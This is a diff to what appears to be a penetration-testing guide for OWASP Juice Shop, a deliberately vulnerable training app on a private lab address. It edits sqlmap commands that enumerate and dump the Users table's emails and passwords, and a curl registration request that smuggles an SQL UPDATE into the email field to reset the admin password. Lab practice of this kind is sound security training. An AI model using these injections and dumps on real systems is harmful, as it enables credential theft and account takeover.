@@ -51,7 +51,7 @@ TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --technique=BEU --level=5 --risk=3 \
+  --dbms=sqlite --level=5 --risk=3 \
   --batch --dump
 ```
 
@@ -82,7 +82,7 @@ TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
 sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=apple" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --technique=U --level=5 --risk=3 \
+  --dbms=sqlite --level=5 --risk=3 \
   --tables --batch
 ```
 
@@ -234,13 +234,13 @@ time_based_sqli(url, true_payload, false_payload)
 3. The malicious SQL may execute when the email is processed internally
 4. Try logging in as admin with password 'hacked'
 
-**Registration Command (Combined UPDATE and INSERT):**
+**Registration Command (Admin Password Update Only):**
 
 ```zsh
 curl -X POST "http://10.30.0.237:3000/api/Users/" \
   -H "Content-Type: application/json" \
   -d '{
-    "email": "test'\'' UPDATE Users SET password='\''c8d15d6f49780e0f7841278759b12cbc'\'' WHERE email='\''admin@juice-sh.op'\''; INSERT INTO Users (email,password) VALUES ('\''hacker@test.com'\'','\''password'\'')--@test.com",
+    "email": "test'\'' UPDATE Users SET password='\''c8d15d6f49780e0f7841278759b12cbc'\'' WHERE email='\''admin@juice-sh.op'\''--@test.com",
     "password": "password123",
     "passwordRepeat": "password123",
     "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2024-01-01", "updatedAt": "2024-01-01"},
@@ -296,35 +296,35 @@ TOKEN=$(curl -s -X POST "http://10.30.0.237:3000/rest/user/login" \
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --dbs --batch
+  --dbms=sqlite --level=5 --dbs --batch
 
 # Enumerate tables
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite --tables --batch
+  --dbms=sqlite --level=5 --tables --batch
 
 # Enumerate columns for Users table
 sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite -T Users --columns --batch
+  --dbms=sqlite --level=5 -T Users --columns --batch
 ```
 
 **2. Data Extraction (with Bearer Token):**
 
 ```zsh
-# Dump all Users table data
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
+# Dump Users table via product search endpoint
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite -T Users --dump --batch
+  --dbms=sqlite --level=5 -T Users --dump --batch
 
-# Dump specific columns
-sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
+# Dump specific columns from product search
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
-  --dbms=sqlite -T Users -C email,password --dump --batch
+  --dbms=sqlite --level=5 -T Users -C email,password --dump --batch
 ```
 
 **3. Advanced SQLMap Options (with Bearer Token):**
@@ -334,7 +334,7 @@ sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
   --headers="Authorization: Bearer $TOKEN" \
   --headers="Content-Type: application/json" \
   --dbms=sqlite --level=5 --risk=3 \
-  --technique=BEUSTQ --batch --threads=4
+  --batch --threads=4
 ```
 
 # All other SQLMap and curl commands should use the Bearer token as shown above.
